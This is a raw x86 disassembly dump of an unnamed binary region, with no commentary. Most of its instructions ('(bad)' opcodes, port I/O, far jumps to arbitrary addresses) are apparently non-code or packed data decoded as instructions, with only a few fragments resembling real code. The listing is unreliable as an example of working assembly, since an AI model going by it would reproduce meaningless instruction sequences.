  40b435:	test   al,0x4d
  40b437:	and    DWORD PTR [ebx-0x72f91be9],ecx
  40b43d:	clc    
  40b43e:	inc    ecx
  40b43f:	mov    esp,0xb51cdc34
  40b444:	sti    
  40b445:	out    0x81,al
  40b447:	leave  
  40b448:	in     al,0x98
  40b44a:	(bad)  
  40b44b:	mov    dl,0xaa
  40b44d:	xor    ecx,DWORD PTR [ebx-0x7f551618]
  40b453:	mov    dh,0xf0
  40b455:	(bad)  
  40b456:	shr    BYTE PTR [eax],1
  40b458:	or     ah,BYTE PTR [ebx+0x21]
  40b45b:	popa   
  40b45c:	fld    DWORD PTR [ebp+eiz*8-0x67bbcd54]
  40b463:	pushf  
  40b464:	out    0xe7,eax
  40b466:	fistp  DWORD PTR [edi-0xf]
  40b469:	outs   dx,BYTE PTR ds:[esi]
  40b46a:	or     DWORD PTR [ebp-0x73444ce0],eax
  40b470:	xchg   edi,eax
  40b471:	loop   0x40b420
  40b473:	push   eax
  40b474:	ins    BYTE PTR es:[edi],dx
  40b475:	lea    edi,[ebx]
  40b477:	fdiv   st,st(6)
  40b479:	(bad)  
  40b47a:	pop    ecx
  40b47b:	data16 in al,dx
  40b47d:	and    eax,0xa6cb41d3
  40b482:	and    eax,0xe7444ddc
  40b487:	adc    eax,0x14ff4142
  40b48c:	hlt    
  40b48d:	mov    ds:0x42e85ce6,al
  40b492:	jmp    0xbc6006d9
  40b497:	mov    DWORD PTR [ecx],0xee8c204a
  40b49d:	repnz scas al,BYTE PTR es:[edi]
  40b49f:	adc    ch,BYTE PTR [edx-0x5d]
  40b4a2:	int3   
  40b4a3:	add    dl,BYTE PTR [esi]
  40b4a5:	dec    esp
  40b4a6:	cdq    
  40b4a7:	popf   
  40b4a8:	bound  eax,QWORD PTR [ecx+0x36629330]
  40b4ae:	sbb    DWORD PTR ds:0xa3a6eb77,edi
  40b4b4:	je     0x40b472
  40b4b6:	xor    DWORD PTR [ebx+0x746f47bf],edx
  40b4bc:	sub    dl,BYTE PTR [esi]
  40b4be:	mov    bl,0xcd
  40b4c0:	neg    DWORD PTR [edx]
  40b4c2:	popa   
  40b4c3:	loopne 0x40b53b
  40b4c5:	mov    cl,cl
  40b4c7:	aad    0x6e
  40b4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ca:	out    dx,al
  40b4cb:	outs   dx,DWORD PTR ds:[esi]
  40b4cc:	ja     0x40b4f2
  40b4ce:	mov    ebx,0xa02322c8
  40b4d3:	pop    edi
  40b4d4:	xchg   esi,eax
  40b4d5:	mov    ch,0xf9
  40b4d7:	pop    ss
  40b4d8:	mov    ah,0x2e
  40b4da:	repz aaa 
  40b4dc:	sub    DWORD PTR [edx+0x16],eax
  40b4df:	jae    0x40b4be
  40b4e1:	(bad)  
  40b4e2:	adc    bh,BYTE PTR [edi-0x36]
  40b4e5:	mov    al,ds:0xf472d523
  40b4ea:	adc    BYTE PTR [esi+0x2ceeb393],bh
  40b4f0:	or     dl,BYTE PTR [esi+edi*1]
  40b4f3:	inc    esp
  40b4f4:	pop    esp
  40b4f5:	push   esi
  40b4f6:	mov    ah,0xf8
  40b4f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4f9:	dec    edx
  40b4fa:	lock fidiv WORD PTR [edi-0x694f9b63]
  40b501:	xor    eax,0x3812ecf4
  40b506:	inc    eax
  40b507:	jne    0x40b52a
  40b509:	inc    esp
  40b50a:	jge    0x40b499
  40b50c:	mov    al,0xad
  40b50e:	jge    0x40b522
  40b510:	cmp    eax,0xe2291a4d
  40b515:	pop    ebp
  40b516:	outs   dx,BYTE PTR ds:[esi]
  40b517:	(bad)  
  40b518:	mov    ds:0x9bf040c6,eax
  40b51d:	fsubr  DWORD PTR [ecx]
  40b51f:	out    0xac,eax
  40b521:	jns    0x40b54c
  40b523:	mov    fs,WORD PTR [ebx-0x73]
  40b526:	pop    ebx
  40b527:	add    bh,0xdd
  40b52a:	gs es and eax,0xa48aadbf
  40b531:	or     BYTE PTR [ecx+ecx*8+0x45],ch
  40b535:	jno    0x40b554
  40b537:	sub    DWORD PTR [ecx],eax
  40b539:	call   0xbd4a27cd
  40b53e:	cmp    ah,BYTE PTR [ecx]
  40b540:	test   ch,al
  40b542:	pop    edi
  40b543:	push   0xffffffa0
  40b545:	xchg   edx,eax
  40b546:	mov    eax,ds:0xddfdd225
  40b54b:	ins    DWORD PTR es:[edi],dx
  40b54c:	cwde   
  40b54d:	cmp    eax,0x22917a0e
  40b552:	push   cs
  40b553:	addr16 in al,dx
  40b555:	outs   dx,DWORD PTR ds:[esi]
  40b556:	popa   
  40b557:	and    DWORD PTR [ebp+0x27],ebp
  40b55a:	mov    ds:0x19daaa3c,al
  40b55f:	ins    BYTE PTR es:[edi],dx
  40b560:	jne    0x40b4f5
  40b562:	call   0xeb95:0xa7dd8133
  40b569:	lahf   
  40b56a:	test   al,0xe8
  40b56c:	pop    esi
  40b56d:	fsubr  DWORD PTR [eax+0x25]
  40b570:	mov    dh,0x86
  40b572:	std    
  40b573:	int    0x41
  40b575:	pop    es
  40b576:	ins    DWORD PTR es:[edi],dx
  40b577:	xchg   DWORD PTR [edx-0x109fee40],ebx
  40b57d:	inc    esp
  40b57e:	idiv   DWORD PTR [ebp+0x4]
  40b581:	inc    edx
  40b582:	sbb    DWORD PTR ds:0xe098d495,0x28
  40b589:	cmp    al,0xb0
  40b58b:	call   DWORD PTR [ecx]
  40b58d:	fwait
  40b58e:	inc    edi
  40b58f:	pop    eax
  40b590:	push   cs
  40b591:	mov    edi,0xd09953f
  40b596:	test   al,0xda
  40b598:	lods   eax,DWORD PTR ds:[esi]
  40b599:	dec    eax
  40b59a:	cs inc esp
  40b59c:	xchg   BYTE PTR [ecx-0x51],cl
  40b59f:	xchg   BYTE PTR [ebp+0x29],bh
  40b5a2:	gs call 0x78cc:0xb137c074
  40b5aa:	addr16 jne 0x40b585
  40b5ad:	out    dx,al
  40b5ae:	fcomp  QWORD PTR [ecx+0x22]
  40b5b1:	push   es
  40b5b2:	cmp    eax,0x863b3186
  40b5b7:	mov    esi,0x4c7db566
  40b5bc:	(bad)  
  40b5bd:	and    DWORD PTR [ecx+0x1ca32f77],eax
  40b5c3:	test   BYTE PTR [ebx],0x8b
  40b5c6:	imul   ebx,ebp,0x53
  40b5c9:	fidivr WORD PTR [eax-0x5b31bd5f]
  40b5cf:	test   eax,0x6d60a46b
  40b5d4:	cmp    eax,0x3862468f
  40b5d9:	mov    cs,WORD PTR [ebx-0x6477faab]
  40b5df:	fwait
  40b5e0:	outs   dx,BYTE PTR ds:[esi]
  40b5e1:	add    eax,0x2435d4bf
  40b5e6:	xor    eax,0x4e1eff0c
  40b5eb:	xor    BYTE PTR [ebp-0x58306a7],cl
  40b5f1:	arpl   WORD PTR [ebx-0x16],dx
  40b5f4:	add    ecx,DWORD PTR [ecx-0xdfc21ca]
  40b5fa:	or     al,0x36
  40b5fc:	or     DWORD PTR [esi+0x3f],ecx
  40b5ff:	inc    ebx
  40b600:	imul   eax,DWORD PTR [esp+eiz*8],0x68
  40b604:	sti    
  40b605:	jbe    0x40b5e7
  40b607:	pop    es
  40b608:	fist   DWORD PTR [edx+edx*4]
  40b60b:	fcomp  DWORD PTR [ecx]
  40b60d:	xchg   ebp,eax
  40b60e:	loop   0x40b670
  40b610:	mov    DWORD PTR [edi+edi*2],edx
  40b613:	aad    0xf3
  40b615:	cmc    
  40b616:	(bad)  
  40b617:	outs   dx,BYTE PTR ds:[esi]
  40b618:	adc    edi,esi
  40b61a:	sbb    eax,0xcf4c0744
  40b620:	jne    0x40b63b
  40b622:	xlat   BYTE PTR ds:[ebx]
  40b623:	inc    esi
  40b624:	shl    BYTE PTR [esi+0x5637467f],cl
  40b62a:	(bad)  
  40b62b:	pop    ebx
  40b62c:	call   0x9dbf71ef
  40b631:	aas    
  40b632:	pop    edi
  40b633:	shr    DWORD PTR [edx-0x503f4bc8],1
  40b639:	xchg   edi,eax
  40b63a:	sbb    esi,DWORD PTR [esi-0x41]
  40b63d:	call   0x361701ce
  40b642:	jne    0x40b5f2
  40b644:	cmc    
  40b645:	mov    ebx,eax
  40b647:	cmp    DWORD PTR [eax+0x6f],eax
  40b64a:	pop    ecx
  40b64b:	ss xchg ebp,eax
  40b64d:	pop    ds
  40b64e:	add    BYTE PTR [edi-0x76c69223],ch
  40b654:	clc    
  40b655:	arpl   WORD PTR [edx+0x54],bp
  40b658:	jno    0x40b670
  40b65a:	test   al,0xf5
  40b65c:	push   esi
  40b65d:	sahf   
  40b65e:	std    
  40b65f:	ds cdq 
  40b661:	das    
  40b662:	bound  eax,QWORD PTR [edx]
  40b664:	fwait
  40b665:	jns    0x40b6c2
  40b667:	jno    0x40b64c
  40b669:	es fdivr st(2),st
  40b66c:	mov    bh,0x28
  40b66e:	loope  0x40b6ec
  40b670:	shr    dh,cl
  40b672:	xor    esp,DWORD PTR [esi-0x75b00cbc]
  40b678:	push   ds
  40b679:	and    DWORD PTR [ebp+0x512a915],eax
  40b67f:	cmp    DWORD PTR [edi+0x64bcc8ce],eax
  40b685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b686:	fmulp  st(0),st
  40b688:	mov    al,ds:0x90abbc7d
  40b68d:	sub    al,0xa2
  40b68f:	out    0x96,eax
  40b691:	ret    0x831f
  40b694:	inc    esi
  40b695:	and    al,0xc5
  40b697:	push   ss
  40b698:	xor    DWORD PTR [esi],0x63a39646
  40b69e:	retf   
  40b69f:	cli    
  40b6a0:	lods   eax,DWORD PTR ds:[esi]
  40b6a1:	and    DWORD PTR [eax+0x2240e13e],ebp
  40b6a7:	movq   QWORD PTR [edx],mm4
  40b6aa:	repnz sub BYTE PTR [ecx-0x26],bl
  40b6ae:	data16 cld 
  40b6b0:	mov    eax,0xee67bfc6
  40b6b5:	in     eax,0xce
  40b6b7:	push   edi
  40b6b8:	mov    ebx,0xf2780955
  40b6bd:	xchg   ecx,eax
  40b6be:	rcl    BYTE PTR [eax-0x2e956cb9],cl
  40b6c4:	outs   dx,DWORD PTR ds:[esi]
  40b6c5:	outs   dx,BYTE PTR ds:[esi]
  40b6c6:	jecxz  0x40b68b
  40b6c8:	cmp    al,0x3
  40b6ca:	mov    ah,0xfc
  40b6cc:	xchg   esp,eax
  40b6cd:	fwait
  40b6ce:	push   ds
  40b6cf:	mov    ecx,0x5caf0de4
  40b6d4:	(bad)  [ecx]
  40b6d6:	push   esi
  40b6d7:	mov    edx,DWORD PTR [esi+0x211cbcb9]
  40b6dd:	cld    
  40b6de:	outs   dx,DWORD PTR ds:[esi]
  40b6df:	call   0x2120728a
  40b6e4:	jecxz  0x40b70a
  40b6e6:	shl    esp,0x5f
  40b6e9:	inc    edi
  40b6ea:	inc    ebp
  40b6eb:	daa    
  40b6ec:	test   eax,0x108a6f82
  40b6f1:	jb     0x40b74d
  40b6f3:	jg     0x40b67e
  40b6f5:	add    ecx,ebp
  40b6f7:	xchg   DWORD PTR [ecx],ecx
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [edx],es
  40b719:	int    0x4c
  40b71b:	test   al,0x14
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	out    dx,eax
  40b725:	mov    al,0x62
  40b727:	adc    al,0x69
  40b729:	std    
  40b72a:	cmp    edi,edi
  40b72c:	xchg   esi,eax
  40b72d:	sbb    al,0xa3
  40b72f:	inc    ebp
  40b730:	or     al,0xd0
  40b732:	and    BYTE PTR [edi+0x70635a26],dh
  40b738:	in     al,dx
  40b739:	enter  0xa30c,0xe8
  40b73d:	dec    eax
  40b73e:	inc    esp
  40b73f:	out    0x86,eax
  40b741:	xor    eax,0x8b219898
  40b746:	sti    
  40b747:	xor    al,0x0
  40b749:	inc    esp
  40b74a:	mov    edx,0x34714660
  40b74f:	pop    esp
  40b750:	pop    edx
  40b751:	(bad)  
  40b753:	fmul   QWORD PTR [edi]
  40b755:	aas    
  40b756:	pop    ebx
  40b757:	repz xor eax,0xdb267ad8
  40b75d:	dec    edx
  40b75e:	pop    ecx
  40b75f:	loope  0x40b794
  40b761:	dec    ebp
  40b762:	xchg   edx,eax
  40b763:	js     0x40b7e0
  40b765:	stos   BYTE PTR es:[edi],al
  40b766:	or     BYTE PTR [esp+eiz*2],al
  40b769:	cmp    BYTE PTR [ecx+0x54e4f9f7],al
  40b76f:	cdq    
  40b770:	mov    esp,0xdbef05ab
  40b775:	cs sbb al,0x86
  40b778:	ds push cs
  40b77a:	retf   
  40b77b:	daa    
  40b77c:	and    eax,0x8689a304
  40b781:	je     0x40b7d5
  40b783:	arpl   WORD PTR ds:0xea0a874f,ax
  40b789:	add    al,0x6f
  40b78b:	cld    
  40b78c:	popa   
  40b78d:	aas    
  40b78e:	enter  0xb951,0x7
  40b792:	out    0x2f,al
  40b794:	inc    edi
  40b795:	out    dx,eax
  40b796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b797:	gs push ss
  40b799:	mov    ds:0x69abdcc6,eax
  40b79e:	xlat   BYTE PTR ds:[ebx]
  40b79f:	fwait
  40b7a0:	jp     0x40b76d
  40b7a2:	push   ss
  40b7a3:	mov    ds:0xfb54329,al
  40b7a8:	inc    edx
  40b7a9:	icebp  
  40b7aa:	pop    edx
  40b7ab:	dec    edx
  40b7ac:	jo     0x40b78a
  40b7ae:	add    eax,0xcd92b361
  40b7b3:	dec    eax
  40b7b4:	xchg   edx,eax
  40b7b5:	cmp    al,0x89
  40b7b7:	or     eax,0xff541857
  40b7bc:	sahf   
  40b7bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7be:	sbb    esp,DWORD PTR [eax]
  40b7c0:	test   esi,ebp
  40b7c2:	std    
  40b7c3:	jno    0x40b826
  40b7c5:	push   ecx
  40b7c6:	ret    
  40b7c7:	mov    ah,0xe0
  40b7c9:	and    eax,0x57bee5eb
  40b7ce:	test   BYTE PTR [ebp-0xc3fd6df],0xd4
  40b7d5:	call   0x13c18d35
  40b7da:	es xchg ebp,eax
  40b7dc:	sbb    dh,0xdd
  40b7df:	(bad)  
  40b7e1:	push   0x6d
  40b7e3:	jecxz  0x40b7e1
  40b7e5:	xor    al,0xaa
  40b7e7:	jl     0x40b811
  40b7e9:	adc    ebp,ecx
  40b7eb:	sbb    eax,0xfd424370
  40b7f0:	jne    0x40b7b5
  40b7f2:	pop    es
  40b7f3:	retf   0xe9c0
  40b7f6:	neg    BYTE PTR [ebx+0x21]
  40b7f9:	or     dl,BYTE PTR [edi+0x43]
  40b7fc:	xor    esi,edi
  40b7fe:	test   DWORD PTR [edx+0x18],ebx
  40b801:	pushf  
  40b802:	jnp    0x40b7ec
  40b804:	xor    DWORD PTR [edx+0x20],0xffffffb5
  40b808:	mov    ch,0xd5
  40b80a:	jns    0x40b838
  40b80c:	and    DWORD PTR [eax],esp
  40b80e:	xchg   edx,eax
  40b80f:	rcr    ebx,cl
  40b811:	(bad)  
  40b812:	daa    
  40b813:	adc    dh,al
  40b815:	xchg   ebp,eax
  40b816:	adc    eax,ebx
  40b818:	cmp    BYTE PTR [ebx+0x42],0x56
  40b81c:	mov    edx,0x64dbbcd6
  40b821:	and    bl,BYTE PTR [esi]
  40b823:	cmp    eax,0x670dbfb5
  40b828:	push   es
  40b829:	daa    
  40b82a:	mov    bh,0x3a
  40b82c:	add    DWORD PTR ds:0x84a00c82,esi
  40b832:	bound  ebp,QWORD PTR [eax-0x2f85c592]
  40b838:	ins    DWORD PTR es:[edi],dx
  40b839:	mov    bh,0xdc
  40b83b:	cmp    al,0x2
  40b83d:	bound  edi,QWORD PTR [eax]
  40b83f:	mov    ecx,0xaa76fe2c
  40b844:	add    eax,0x567441b8
  40b849:	xchg   ebp,eax
  40b84a:	cmp    esp,DWORD PTR [ebx+0x18]
  40b84d:	retf   
  40b84e:	jne    0x40b881
  40b850:	jno    0x40b835
  40b852:	pop    ecx
  40b854:	and    DWORD PTR [eax],ecx
  40b856:	data16 test BYTE PTR [ebx-0x70838f9e],bl
  40b85d:	sub    DWORD PTR [eax+eax*8-0x2e],0xe830bf9f
  40b865:	add    DWORD PTR [ecx-0x1d],esp
  40b868:	xor    DWORD PTR [edi],eax
  40b86a:	lods   al,BYTE PTR ds:[esi]
  40b86b:	mov    bl,0x31
  40b86d:	inc    edi
  40b86e:	adc    DWORD PTR [edi+ebx*4+0x76aceaaa],0xffffff92
  40b876:	call   0x419e:0x451185f0
  40b87d:	test   al,0xd2
  40b87f:	push   ebp
  40b880:	mov    ebp,0xfff9f96e
  40b885:	and    al,0x22
  40b887:	cs mov eax,0x71efa47
  40b88d:	mov    edx,0x42de2000
  40b892:	sar    edi,1
  40b894:	aaa    
  40b895:	jge    0x40b907
  40b897:	pop    esi
  40b898:	test   al,0x5b
  40b89a:	jno    0x40b8d3
  40b89c:	inc    edx
  40b89d:	(bad)  
  40b89e:	into   
  40b89f:	adc    al,0x87
  40b8a1:	fst    QWORD PTR [esi]
  40b8a3:	aad    0x7c
  40b8a5:	neg    BYTE PTR [esi-0x4e25367a]
  40b8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ac:	pop    ecx
  40b8ad:	out    dx,al
  40b8ae:	retf   
  40b8af:	push   esp
  40b8b0:	ja     0x40b8e0
  40b8b2:	loope  0x40b91b
  40b8b4:	cmp    ecx,DWORD PTR ds:0x7ec1332f
  40b8ba:	daa    
  40b8bb:	mov    ecx,0x4ac1a94d
  40b8c0:	aam    0x80
  40b8c2:	adc    ebx,esp
  40b8c4:	(bad)  
  40b8c6:	or     edx,DWORD PTR [esi-0xa]
  40b8c9:	les    eax,FWORD PTR [eax]
  40b8cb:	adc    BYTE PTR [eax],cl
  40b8cd:	scas   eax,DWORD PTR es:[edi]
  40b8ce:	xor    DWORD PTR [edx+0x4c644410],esi
  40b8d4:	dec    edx
  40b8d5:	push   ebx
  40b8d6:	mov    al,ds:0x147d0ae7
  40b8db:	inc    ebp
  40b8dc:	mov    cl,0xaf
  40b8de:	(bad)  
  40b8df:	fptan  
  40b8e1:	fucom  st(5)
  40b8e3:	clc    
  40b8e4:	mov    eax,ds:0xa1bdb2df
  40b8e9:	sub    al,0x91
  40b8eb:	mov    esi,0xa1ccf127
  40b8f0:	xchg   esi,eax
  40b8f1:	and    al,BYTE PTR [ecx-0x613f93cb]
  40b8f7:	mov    eax,ds:0x3b6d393d
  40b8fc:	sub    ebp,DWORD PTR [esi-0x1a9b49f0]
  40b902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b903:	(bad)  
  40b905:	cmp    DWORD PTR [edx-0x1739ad7c],edx
  40b90b:	in     al,dx
  40b90c:	loope  0x40b97f
  40b90e:	cmp    al,0xc8
  40b910:	out    dx,al
  40b911:	clc    
  40b912:	push   0x9d43c054
  40b917:	das    
  40b918:	mov    ds:0x24af0212,eax
  40b91d:	pushf  
  40b91e:	sub    al,0x79
  40b920:	iret   
  40b921:	pop    edx
  40b922:	dec    ebx
  40b923:	btr    ebp,edi
  40b926:	mov    dh,0xc7
  40b928:	pop    esp
  40b929:	xor    ecx,DWORD PTR [eax+0x31779a9d]
  40b92f:	lods   al,BYTE PTR ds:[esi]
  40b930:	dec    esp
  40b931:	mov    ah,0xdb
  40b933:	mov    cl,0xca
  40b935:	push   0x4f
  40b937:	fcmove st,st(6)
  40b939:	sbb    edx,DWORD PTR [ebx]
  40b93b:	outs   dx,BYTE PTR ds:[esi]
  40b93c:	mov    dh,0x4
  40b93e:	sbb    DWORD PTR [esi-0x3e],ebp
  40b941:	sbb    BYTE PTR [edi],0x5e
  40b944:	stos   BYTE PTR es:[edi],al
  40b945:	cmp    eax,0xb9f7a0db
  40b94a:	inc    eax
  40b94b:	in     eax,0x30
  40b94d:	cld    
  40b94e:	push   edi
  40b94f:	or     DWORD PTR [edx],edi
  40b951:	push   ebp
  40b952:	in     eax,dx
  40b953:	mov    ecx,0x1d5e67ce
  40b958:	push   cs
  40b959:	jmp    0x518:0x706988b8
  40b960:	into   
  40b961:	mov    ch,0xc7
  40b963:	cwde   
  40b964:	mov    ds:0x8dbd0243,al
  40b969:	mov    eax,0x20915870
  40b96e:	fisub  DWORD PTR [ecx-0x68]
  40b971:	cmp    ah,BYTE PTR [edx-0x44]
  40b974:	push   edi
  40b975:	sub    cl,ah
  40b977:	mov    edi,0xb06b4d15
  40b97c:	mov    eax,ds:0xc5615d35
  40b981:	jle    0x40b9b2
  40b983:	fmul   DWORD PTR [eax+0x68]
  40b986:	(bad)  
  40b987:	mov    ebp,0x3ba119d
  40b98c:	jle    0x40b94a
  40b98e:	nop
  40b98f:	lea    eax,ds:0x6eecbd8
  40b995:	lods   al,BYTE PTR ds:[esi]
  40b996:	(bad)  [edx+0x12]
  40b999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b99a:	ficomp WORD PTR [ebx]
  40b99c:	xchg   DWORD PTR [ebp-0x305fa7ff],ebp
  40b9a2:	lea    esp,[ecx+ecx*4+0x225c025a]
  40b9a9:	ins    BYTE PTR es:[edi],dx
  40b9aa:	pop    ss
  40b9ab:	xlat   BYTE PTR ds:[ebx]
  40b9ac:	repz inc ecx
  40b9ae:	and    DWORD PTR [esi-0x4dfe2e15],0x8308a077
  40b9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b9:	inc    eax
  40b9ba:	mov    bl,0x3
  40b9bc:	(bad)  
  40b9bd:	mov    bl,0xb1
  40b9bf:	lods   al,BYTE PTR ds:[esi]
  40b9c0:	and    BYTE PTR [edi-0xb8329ab],0xef
  40b9c7:	pop    ss
  40b9c8:	inc    esp
  40b9c9:	push   eax
  40b9ca:	push   ss
  40b9cb:	dec    edx
  40b9cc:	jge    0x40ba13
  40b9ce:	(bad)  
  40b9d0:	clc    
  40b9d1:	xchg   esp,eax
  40b9d2:	jno    0x40ba1f
  40b9d4:	std    
  40b9d5:	jo     0x40b9ef
  40b9d7:	jge    0x40ba01
  40b9d9:	jg     0x40b95e
  40b9db:	xchg   ebx,eax
  40b9dc:	inc    edx
  40b9dd:	test   al,0xcb
  40b9df:	pop    esi
  40b9e0:	shl    BYTE PTR [eax-0x8284b35],0x1f
  40b9e7:	lods   eax,DWORD PTR ds:[esi]
  40b9e8:	test   DWORD PTR [ebx-0x1],esp
  40b9eb:	jne    0x40ba35
  40b9ed:	lahf   
  40b9ee:	and    esi,ebx
  40b9f0:	stos   DWORD PTR es:[edi],eax
  40b9f1:	push   cs
  40b9f2:	leave  
  40b9f3:	aad    0x8f
  40b9f5:	pop    es
  40b9f6:	scas   al,BYTE PTR es:[edi]
  40b9f7:	cwde   
  40b9f8:	sar    BYTE PTR [ebx+eiz*2-0xb53755a],0x20
  40ba00:	and    bl,BYTE PTR [edx-0x14d2221d]
  40ba06:	inc    edi
  40ba07:	adc    ah,dh
  40ba09:	adc    dl,BYTE PTR [edi]
  40ba0b:	loop   0x40ba84
  40ba0d:	push   edi
  40ba0e:	fiadd  DWORD PTR [ecx+0x25]
  40ba12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba13:	stos   BYTE PTR es:[edi],al
  40ba14:	iret   
  40ba15:	mov    cl,0x46
  40ba17:	fist   WORD PTR [eax+0x11]
  40ba1a:	or     dh,BYTE PTR [esi-0x1e]
  40ba1d:	iret   
  40ba1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1f:	inc    ecx
  40ba20:	mov    cl,BYTE PTR [esi]
  40ba22:	jno    0x40ba1f
  40ba24:	ds mov ah,0x3c
  40ba27:	dec    esi
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    dh,BYTE PTR [edx]
  40ba40:	rcr    ebx,cl
  40ba42:	dec    ebp
  40ba43:	adc    BYTE PTR [edi+0x7d7a7e7e],al
  40ba49:	jle    0x40bac9
  40ba4b:	ret    0xa18
  40ba4e:	sub    DWORD PTR [ecx-0x396b0505],ebp
  40ba54:	mov    fs,WORD PTR [eax+edx*1-0x32]
  40ba58:	inc    ecx
  40ba59:	cmp    eax,0x123a0da6
  40ba5e:	push   ebp
  40ba5f:	cs pop ds
  40ba61:	(bad)  
  40ba62:	clc    
  40ba63:	out    dx,al
  40ba64:	loopne 0x40ba14
  40ba66:	cmp    edx,DWORD PTR [edi]
  40ba68:	jo     0x40ba40
  40ba6a:	mov    ebp,0x9fd78b4c
  40ba6f:	sub    cl,BYTE PTR cs:[ebx+0x51]
  40ba73:	dec    esi
  40ba74:	aam    0xf8
  40ba76:	mov    WORD PTR [ebx+0xe],ss
  40ba79:	in     eax,0x7e
  40ba7b:	stc    
  40ba7c:	jmp    0xa806bff7
  40ba81:	lods   eax,DWORD PTR ds:[esi]
  40ba82:	jmp    0x40ba91
  40ba84:	mov    ch,0x67
  40ba86:	cs fs es iret 
  40ba8a:	clc    
  40ba8b:	push   edx
  40ba8c:	push   ds
  40ba8d:	js     0x40ba19
  40ba8f:	sub    ebp,esp
  40ba91:	arpl   WORD PTR [esi+0x6459bd83],bx
  40ba97:	outs   dx,BYTE PTR ds:[esi]
  40ba98:	(bad)  
  40ba99:	and    eax,0x9c5cd9bb
  40ba9e:	addr16 loop 0x40baf6
  40baa1:	mov    eax,DWORD PTR [edx+ebx*2-0x63488659]
  40baa8:	xchg   ecx,eax
  40baa9:	sbb    eax,0x2e239541
  40baae:	xor    DWORD PTR [ecx-0x38],edi
  40bab1:	mov    ebx,0xa4d9e25f
  40bab6:	adc    al,0xd2
  40bab8:	cwde   
  40bab9:	popf   
  40baba:	xchg   ebx,eax
  40babb:	call   0x20471315
  40bac0:	mov    ds:0xfbc09bf0,eax
  40bac5:	scas   al,BYTE PTR es:[edi]
  40bac6:	jg     0x40ba58
  40bac8:	sub    ch,BYTE PTR [ebx+0x2274b0fc]
  40bace:	pop    ebp
  40bad0:	jge    0x40bb07
  40bad2:	(bad)
  40bad7:	xchg   edi,eax
  40bad8:	fxch   st(2)
  40bada:	dec    esi
  40badb:	mov    ds:0x77a2713b,eax
  40bae0:	and    dh,BYTE PTR [ecx]
  40bae2:	mov    dl,0xbd
  40bae4:	imul   edi,DWORD PTR [ecx],0x6f717c12
  40baea:	add    BYTE PTR [ecx+ecx*1+0x6f],al
  40baee:	mov    ecx,0x38422f55
  40baf3:	loope  0x40bb4b
  40baf5:	dec    ebx
  40baf6:	cwde   
  40baf7:	and    ah,0xb6
  40bafa:	cld    
  40bafb:	out    0x1e,al
  40bafd:	push   ebp
  40bafe:	push   cs
  40baff:	jle    0x40bb0c
  40bb01:	and    cl,BYTE PTR [ebp+0x77e45284]
  40bb07:	or     eax,0xdff04c27
  40bb0c:	call   0xc8731859
  40bb11:	lds    ebp,FWORD PTR [esi]
  40bb13:	xor    ch,BYTE PTR [edi+0x7a53f1b9]
  40bb19:	outs   dx,DWORD PTR ds:[esi]
  40bb1a:	imul   ebp,DWORD PTR [esi],0xae1bc4a2
  40bb20:	shr    al,cl
  40bb22:	lahf   
  40bb23:	jl     0x40bb6b
  40bb25:	push   0xffffffe5
  40bb27:	sbb    BYTE PTR [ebp-0x2a],ah
  40bb2a:	inc    ebx
  40bb2b:	ss mov edi,0x946f9299
  40bb31:	xor    eax,0xfaeec014
  40bb36:	push   esp
  40bb37:	and    BYTE PTR [edi+edi*1],bl
  40bb3a:	jmp    0x40bb89
  40bb3c:	push   0x84e4e21f
  40bb41:	rcr    edi,1
  40bb43:	cmp    DWORD PTR [esi],ebp
  40bb45:	push   edi
  40bb46:	xchg   BYTE PTR [edx-0x5c],bh
  40bb49:	jnp    0x40bbba
  40bb4b:	sbb    bl,dh
  40bb4d:	pop    ds
  40bb4e:	inc    edi
  40bb4f:	(bad)  
  40bb50:	out    dx,al
  40bb51:	mov    WORD PTR [eax-0x6d],fs
  40bb54:	sbb    ecx,ebp
  40bb56:	xor    BYTE PTR [edx],0x5
  40bb59:	lahf   
  40bb5a:	adc    eax,DWORD PTR [ebx]
  40bb5c:	push   ebp
  40bb5d:	sub    eax,0x71d6d343
  40bb62:	(bad)  
  40bb64:	inc    ebx
  40bb65:	pop    ebp
  40bb66:	push   ss
  40bb67:	sbb    BYTE PTR [edi-0x5c],0xb8
  40bb6b:	push   ebx
  40bb6c:	aam    0x8d
  40bb6e:	pop    edi
  40bb6f:	jle    0x40bb24
  40bb71:	test   BYTE PTR [eiz*1-0x689eca4],dh
  40bb78:	lods   al,BYTE PTR ds:[esi]
  40bb79:	outs   dx,BYTE PTR ds:[esi]
  40bb7a:	push   ss
  40bb7b:	push   ds
  40bb7c:	cdq    
  40bb7d:	jne    0x40bbf5
  40bb7f:	and    cl,BYTE PTR [ecx-0x4a]
  40bb82:	scas   eax,DWORD PTR es:[edi]
  40bb83:	push   0x338c50b6
  40bb88:	sti    
  40bb89:	jg     0x40bb9f
  40bb8b:	lea    eax,[ebp+0xb]
  40bb8e:	ss aaa 
  40bb90:	lea    edi,[edx]
